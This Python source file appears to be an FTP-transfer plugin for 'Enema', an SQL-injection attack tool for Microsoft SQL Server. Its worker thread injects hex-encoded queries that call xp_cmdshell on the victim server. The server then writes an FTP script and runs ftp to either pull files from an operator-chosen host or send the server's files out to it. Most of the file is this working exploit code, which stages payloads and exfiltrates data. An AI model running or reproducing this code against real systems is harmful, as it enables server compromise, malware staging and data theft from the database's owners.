"""
    Enema plugin (mssql): Ftp file transfer
    Copyright (C) 2011 Kaeso
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import os
import core.txtproc
from core.http import HTTP_Handler
from PyQt4 import QtCore, QtGui

from gui.mssql.ftp.Ui_ftp import Ui_ftpWidget

PLUGIN_NAME = "FTP"

class FtpWidget(QtGui.QWidget):
    
    logSignal = QtCore.pyqtSignal(str)
     
    def __init__(self, vars, qstring, parent=None):
        QtGui.QWidget.__init__(self, parent, QtCore.Qt.Tool)
        self.ui = Ui_ftpWidget()
        self.ui.setupUi(self)
        self.setWindowModality(QtCore.Qt.ApplicationModal)
        self.vars = vars
        self.qstring = core.txtproc.correctQstr(qstring)
        self.ui.progressBar.hide()
        
        self.ui.ftpButton.clicked.connect(self.ftpButton_OnClick)
        
        #Load config
        configPath = "settings/enema.ini"
        if os.path.exists(configPath):
            settings = QtCore.QSettings(configPath, QtCore.QSettings.IniFormat)
            self.ui.lineIP.setText(settings.value('FTP/ip', ''))
            self.ui.lineFtpLogin.setText(settings.value('FTP/login', ''))
            self.ui.lineFtpPwd.setText(settings.value('FTP/password', ''))
            self.ui.lineFtpFile.setText(settings.value('FTP/files', ''))
            self.ui.lineFtpPath.setText(settings.value('FTP/path', ''))
            self.move(settings.value("GUI/mainWpos"))
        #---

    def emitLog(self, logStr):
        self.logSignal.emit(logStr)
    
    #Hidding progressbar when task is done
    def taskDone(self):
        self.ui.progressBar.hide()

#Is program busy at this moment
    def isBusy(self):
        try:
            if self.worker.isRunning():
                return True
        except AttributeError:
            return False
            
    #FTP Upload button click        
    def ftpButton_OnClick(self):
        if self.isBusy():
            return
        #Adding variables from plugin widget
        ftpPath = self.ui.lineFtpPath.text()
        if len(ftpPath) > 0:
            if ftpPath[-1] != "\\":
                ftpPath += "\\"
        self.vars['login'] = self.ui.lineFtpLogin.text()
        self.vars['password'] = self.ui.lineFtpPwd.text()
        self.vars['ftpFiles'] = self.ui.lineFtpFile.text().split(";")
        self.vars['ftpPath'] = ftpPath
        self.vars['ip'] = self.ui.lineIP.text()
        if self.ui.radioGet.isChecked():
            self.vars['ftp_mode'] = 'get'
        else:
            self.vars['ftp_mode'] = 'send'
        #---
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstring)
        #Signal connects
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
        self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
        #---
        self.worker.start()
        
    #When widget closing
    def closeEvent(self, event):
        #Saving settings
        settings = QtCore.QSettings("settings/enema.ini", QtCore.QSettings.IniFormat)
        settings.setValue('FTP/ip', self.ui.lineIP.text())
        settings.setValue('FTP/login', self.ui.lineFtpLogin.text())
        settings.setValue('FTP/password', self.ui.lineFtpPwd.text())
        settings.setValue('FTP/files', self.ui.lineFtpFile.text())
        settings.setValue('FTP/path', self.ui.lineFtpPath.text())
        settings.setValue('FTP/get', self.ui.radioGet.isChecked())
        settings.setValue('FTP/send', self.ui.radioSend.isChecked())
        settings.sync()

    
class Worker(QtCore.QThread):

    taskDoneSignal = QtCore.pyqtSignal()
    logSignal = QtCore.pyqtSignal(str)
        
    def __init__(self, vars, qstring):
        QtCore.QThread.__init__(self)
        self.vars = vars
        self.qstring = qstring
        self.wq = HTTP_Handler()
        self.wq.logSignal.connect(self.log)
        
    def log(self, logStr):
        self.logSignal.emit(logStr)
            
    def run(self):
        self.logSignal.emit("+++ [" + PLUGIN_NAME + "]: TASK STARTED +++")
        #if defined non-standart ftp port
        ipaddr = self.vars['ip'].replace(":", " ")
        ftpFiles = self.vars['ftpFiles']
        tmp_file = self.vars['ftpPath'] + "xftp.txt"
        
        #del ..\temp\ftp.txt /Q
        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
        query = self.wq.buildQuery(self.qstring, self.vars)
        self.wq.httpRequest(query, True, self.vars)
        
        #echo open 127.0.0.1 21> ..\temp\ftp.txt
        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo open " + ipaddr + "> " + tmp_file + "'", True)
        query = self.wq.buildQuery(self.qstring, self.vars)
        self.wq.httpRequest(query, True, self.vars)
        
        #echo login>> ..\temp\ftp.txt
        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['login'] + ">> " + tmp_file + "'", True)
        query = self.wq.buildQuery(self.qstring, self.vars)
        self.wq.httpRequest(query, True, self.vars)
        
        #echo password>> ..\temp\ftp.txt
        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['password'] + ">> " + tmp_file + "'", True)
        query = self.wq.buildQuery(self.qstring, self.vars)
        self.wq.httpRequest(query, True, self.vars)
        
        for file in ftpFiles:
            #Use SEND or GET ftp command?
            if self.vars['ftp_mode'] == "get":
                #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
                self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo get " + file + " " + self.vars['ftpPath']\
                + file + ">> " + tmp_file + "'", True)
                query = self.wq.buildQuery(self.qstring, self.vars)
            else:
                #echo send c:\path\file.exe>> ..\temp\ftp.txt
                self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo send " + self.vars['ftpPath'] +  file + ">> " + tmp_file + "'", True)
                query = self.wq.buildQuery(self.qstring, self.vars)
            self.wq.httpRequest(query, True, self.vars)
            
        #echo bye>> ..\temp\ftp.txt
        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo bye>> " + tmp_file + "'", True)
        query = self.wq.buildQuery(self.qstring, self.vars)
        self.wq.httpRequest(query, True, self.vars)
        
        #ftp -s:..\temp\ftp.txt IP
        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'ftp -s:" + tmp_file + "'", True)
        query = self.wq.buildQuery(self.qstring, self.vars)
        self.wq.httpRequest(query, True, self.vars)
        
        #del ..\temp\ftp.txt /Q
        #self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
        query = self.wq.buildQuery(self.qstring, self.vars)
        self.wq.httpRequest(query, True, self.vars)
        
        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
        self.taskDoneSignal.emit()
        
